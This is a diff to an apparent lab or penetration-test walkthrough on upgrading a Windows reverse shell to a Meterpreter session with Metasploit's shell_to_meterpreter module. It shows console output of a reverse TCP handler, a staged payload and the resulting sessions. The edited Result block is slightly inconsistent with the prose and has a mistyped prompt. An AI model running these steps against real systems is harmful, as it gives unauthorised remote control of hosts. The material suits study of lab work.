@@ -1013,13 +1013,20 @@ set LHOST 192.168.134.39
 **Result**
 
 ```
-[*] Upgrading session ID: 1
-[*] Starting exploit/multi/handler
-[*] Started reverse TCP handler on 192.168.134.39:4433
-[*] Post module execution completed
-[*] Sending stage (248902 bytes) to TARGET_IP
-[*] Meterpreter session 2 opened (192.168.134.39:4433 -> TARGET_IP:49915) at 2026-09-02 02:13:29 -0400
-[*] Stopping exploit/multi/handler
+sf post(multi/manage/shell_to_meterpreter) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type               Information                                               Connection
+  --  ----  ----               -----------                                               ----------
+  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.3.9600] -----  192.168.134.39:4444 -> 10.48.162.9:49269 (10.48.162.9)
+
+msf post(multi/manage/shell_to_meterpreter) > set SESSION 1
+SESSION => 1
+msf post(multi/manage/shell_to_meterpreter) > set LHOST 192.168.134.39
+LHOST => 192.168.134.39
+msf post(multi/manage/shell_to_meterpreter) > 
 ```
 
 `Post module execution completed` prints before the session opens, and the console may need an Enter keypress before the new prompt shows — the module hands the callback to a separate handler that catches it a moment later. Running `run` twice opens a duplicate session; a spare Meterpreter session opened here and was removed with `sessions -k 3`. Session numbers are assigned dynamically and need not be sequential.
